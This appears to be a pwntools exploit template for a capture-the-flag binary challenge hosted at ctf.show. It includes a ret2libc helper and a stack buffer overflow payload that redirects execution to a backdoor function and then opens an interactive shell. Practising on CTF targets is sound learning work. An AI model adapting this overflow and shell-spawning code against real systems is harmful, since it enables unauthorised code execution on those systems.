#!/usr/bin/python3
# -*- coding: UTF-8 -*-

from pwn import *
from LibcSearcher import *
from sys import argv

local = 1
if 'r' in argv:	local = 0
#libc_path = 'libc.so.6'
os_level = 64
binary_name = 'pwn'
remote_addr, port = 'pwn.challenge.ctf.show:28215'.split(':')

if local:
    p = process('./' + binary_name)
    elf = ELF('./' + binary_name)
    #libc = elf.libc
else:
    log.warning('!!REMOTE!!')
    p = remote(remote_addr, port)
    elf = ELF('./' + binary_name)

if os_level == 64:
    context(log_level='debug', os='linux', arch='amd64', bits=64)
    if local: libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
elif os_level == 32:
    context(log_level='debug', os='linux', arch='i386', bits=32)
    if local: libc_path = 'lib/i386-linux-gnu/libc.so.6'
else:
    print('Error os!!!')
    exit()
#libc = ELF(libc_path)
#context.terminal = ['/usr/bin/x-terminal-emulator', '-e']

ru = lambda x: p.recvuntil(x)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sda = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
leak = lambda name,addr: log.success('{}--> {:#x}'.format(name,addr))
uu32 = lambda data: u32(data.ljust(4,b'\x00'))
uu64 = lambda data: u64(data.ljust(8,b'\x00'))
slp = lambda x: sleep(x)

def dbg():
    if local:
        gdb.attach(p)
        pause()
    else:
        pass

def ret2libc(leak:int,funcname:bytes,path=''):
    if path == '':
        libc = LibcSearcher(funcname,leak)
        base = leak - libc.dump(funcname)
        system = base + libc.dump('system')
        bin_sh = base + libc.dump('str_bin_sh')

    else:
        libc = ELF(path)
        base = leak - libc.sym[funcname]
        system = base + libc.sym['system']
        bin_sh = base + next(libc.search(b'/bin/sh'))

    return (system, bin_sh)

#Main function
if __name__ == '__main__':
    #you can add your code here
    hack = 0x400637
    payload = b'a'*128 + b'b'*8 + p64(0x4004fe) + p64(hack)
    dbg()
    sl(payload)
    p.interactive()